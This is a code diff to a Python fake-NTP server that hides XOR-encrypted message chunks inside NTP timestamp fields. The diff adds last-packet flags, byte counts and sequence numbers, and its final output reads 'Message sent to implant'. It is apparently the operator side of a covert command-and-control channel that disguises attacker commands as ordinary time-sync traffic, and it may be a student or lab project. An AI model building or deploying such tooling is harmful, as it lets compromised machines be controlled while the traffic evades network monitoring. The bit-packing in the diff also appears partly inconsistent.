@@ -24,7 +24,7 @@ def pack_fixed64(float_value : float):
     #I: unsigned int (4 bytes == 32 bits)
     return struct.pack('!II', integer, fraction)
 
-def send_ntp_response(sock : socket.socket, client_address : str, client_port : int, data : bytes):
+def send_ntp_response(sock : socket.socket, client_address : str, client_port : int, data : bytes, last_packet : bool, seqNum : int):
 
     c = ntplib.NTPClient()
     response = c.request('time.google.com', version=3)
@@ -46,24 +46,36 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
     receive_timestamp = bytearray(pack_fixed64(response.recv_timestamp))
     transmit_timestamp = bytearray(pack_fixed64(response.tx_timestamp))
 
+    receive_timestamp[7] = 0x00
+    receive_timestamp[6] = 0x00
+
     #Modify flags in receive_timestamp
     if last_packet:
         #Set "last packet" flag
-        receive_timestamp[7] |= (1 << 8)
-
-        #Indicate number of bytes to read from transmit_timestamp
-        byte_count_flag_position = 6 #changing bits 6 and 7
-        bit_mask = 0b11 << byte_count_flag_position #mask = 00000110
-        receive_timestamp[7] &= ~bit_mask #clear counter flag bits
-        receive_timestamp[7] |= (len(data) << byte_count_flag_position)
+        receive_timestamp[7] |= 1
+        length = len(data)
+        print("Length:", length)
+        receive_timestamp[7] |= (length << 1)
+        # #Indicate number of bytes to read from transmit_timestamp
+        # byte_count_flag_position = 6 #changing bits 6 and 7
+        # bit_mask = 0b11 << byte_count_flag_position #mask = 00000110
+        # receive_timestamp[7] &= ~bit_mask #clear counter flag bits
+        # receive_timestamp[7] |= (len(data) << byte_count_flag_position)
     else:
         #Final byte bits: xxxxx110
-        receive_timestamp[7] |= (1 << 6)
-        receive_timestamp[7] |= (1 << 7)
-        receive_timestamp[7] |= (0 << 8)
+        receive_timestamp[7] |= (0 << 0)
+        receive_timestamp[7] |= (3 << 1)
+    
+    shift = (seqNum << 3)
+
+    # modifying first byte for sequence
+    receive_timestamp[6] |= (shift >> 8) & 0xFF
+    # modifying second byte for sequence
+    receive_timestamp[7] |= shift & 0xFF
+
+    print(bin(receive_timestamp[6]), bin(receive_timestamp[7]))
 
     #TODO Set sequnce number
-    
 
     #Overwrite the final 4 bytes of transmit_timestamp with data
     xored_data = bytes([b ^ k for b, k in zip(data, PRIVATE_KEY)])
@@ -98,14 +110,18 @@ while(True):
         exit(0)
 
     data = b''
+    seq = 0
     for char in message:
         data += char.encode('ascii')
         if len(data) == 4:
-            send_ntp_response(sock, client_address, client_port, data)
+            send_ntp_response(sock, client_address, client_port, data, False, seq)
             data = b''
+            seq+= 1
 
     #Send remaining data (<4 bytes)
     if len(data) != 0:
-        send_ntp_response(sock, client_address, client_port, data)
+        send_ntp_response(sock, client_address, client_port, data, True, seq)
+    
+    seq = 0
     
     print("\nMessage sent to implant.\n")
